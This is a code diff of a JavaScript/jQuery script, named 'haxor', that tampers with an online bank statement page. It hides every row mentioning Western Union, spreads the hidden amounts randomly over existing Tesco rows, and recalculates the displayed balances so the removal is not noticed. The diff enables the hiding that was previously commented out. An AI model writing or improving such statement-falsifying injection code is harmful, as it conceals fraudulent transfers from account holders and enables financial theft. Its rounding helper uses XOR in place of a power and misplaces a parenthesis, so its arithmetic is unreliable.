@@ -1,14 +1,27 @@
 var masterTableId = 'statementTable';
 var found = false;
-var timerMonitor = setInterval(haxor, 300);
+var timerMonitor = setInterval(haxor, 30);
 var selector = '#' + masterTableId + ' td:contains("WESTERN UNION")';
 var replacementRecipients = ['TESCO STORES 6077'];
+var formatter = new Intl.NumberFormat('en-GB', { useGrouping: true });
 
 function haxor() {
     clearInterval(timerMonitor);
 
     var $tBody = $('#statementTable tbody.cwa-tbody');
-    var hackTargets = $tBody.find('tr.clickableLine').filter(function(idx, el) { 
+    var allBalanceRows = $tBody.find('tr.clickableLine');
+    
+    // sets row type to each of the rows based on the 
+    allBalanceRows.each(function (idx, el) {
+        if (el.cells[3].textContent.trim() !== '') {
+            $(el).data('_type', 'inflow');
+        }
+        else if (el.cells[4].textContent.trim() !== '') {
+            $(el).data('_type', 'outflow');
+        }
+    });
+
+    var hackTargets = allBalanceRows.filter(function(idx, el) { 
         var row = el;
 
         return !$(el).hasClass('processed') && row.cells[1].textContent.includes('WESTER');
@@ -21,7 +34,7 @@ function haxor() {
         
         console.log('Hiding ' + wuRows.length + ' rows');
         wuRows.addClass('processed');
-        // wuRows.hide();
+        wuRows.hide();
 
         var totalDisplaced = 0;
 
@@ -34,9 +47,49 @@ function haxor() {
         console.log(`Total displaced amount ${totalDisplaced}`);
 
         var newEntries = 10;
-        var distributedValues = distributeDisplacement(totalDisplaced, 5);
+        var distributedValues = distributeDisplacement(totalDisplaced, 5, 30);
 
         console.log(distributedValues);
+
+        var updateRows = $tBody.find('tr.clickableLine').filter(function (idx, el) {
+            return replacementRecipients.includes(el.cells[1].textContent) && !el.cells[1].textContent.includes('WESTER');
+        });
+
+        // set newly distributed amounts to existing rows
+        updateRows.each(function (idx, el) {
+            var currentAmount = parseFloat(el.cells[4].textContent) + distributedValues[idx];
+
+            el.cells[4].textContent = formatter.format(currentAmount.toFixed(2));
+        });
+
+        var newBallances = allBalanceRows.filter(function(idx, el) { 
+            return !$(el).hasClass('processed');
+        });
+
+        newBallances.each(function (idx, el) { 
+            if (idx < newBallances.length) {
+                var nextRow = newBallances[idx + 1];
+                var total = 0;
+
+                if ($(el).data('_type') === 'outflow') {
+                    var outflow = parseFloat($(el)[0].cells[4].textContent.replace(',', ''));
+                    var amount = parseFloat($(el).find('td h4 span').first().text().replace(',', ''));
+
+                    total = Math.roundTo(outflow + amount, 2);
+                }
+                else if ($(el).data('_type') === 'inflow') {
+                    var amount = parseFloat($(el).find('td h4 span').first().text().replace(',', ''));
+                    var inflow = parseFloat($(el)[0].cells[3].textContent.replace(',', ''));
+
+                    total = Math.roundTo(amount - inflow, 2);
+                }
+
+                $(nextRow).find('td h4 span').first().text(formatter.format(total.toFixed(2)));
+            }
+        });
+
+        return;
+        // new rows
 
         var newRow = $(wuRows[0]).clone();
 
@@ -57,10 +110,7 @@ function distributeDisplacement(amountDisplaced, lowerLimit, upperLimit) {
     var randomLower = lowerLimit;
 
     while (true) {
-        // randomUpper = Math.floor(Math.random() * randomUpper, upperLimit);
-        // randomLower = Math.ceil(Math.random() * randomLower, lowerLimit);
-
-        var value = Math.random() * (randomUpper - randomLower) + randomLower;
+        var value = Math.roundTo(Math.random() * (randomUpper - randomLower) + randomLower, 2);
 
         remainingAmount = remainingAmount - value;
 
@@ -68,7 +118,7 @@ function distributeDisplacement(amountDisplaced, lowerLimit, upperLimit) {
             distributedValues.push(value)
         }
         else {
-            distributedValues.push(remainingAmount + value);
+            distributedValues.push(Math.roundTo(remainingAmount + value), 2);
             break;
         }
     }
@@ -90,12 +140,8 @@ function sortTableByDate($tBody) {
    $tBody.append(rowsSorted);
 }
 
-function gaussianRand() {
-    var rand = 0;
-  
-    for (var i = 0; i < 6; i += 1) {
-      rand += Math.random();
-    }
-  
-    return rand / 6;
-  }
+function roundTo(number, places) {
+    return Math.round((10 ^ places) * number) / (10 ^ places);
+}
+
+Math.roundTo = roundTo;
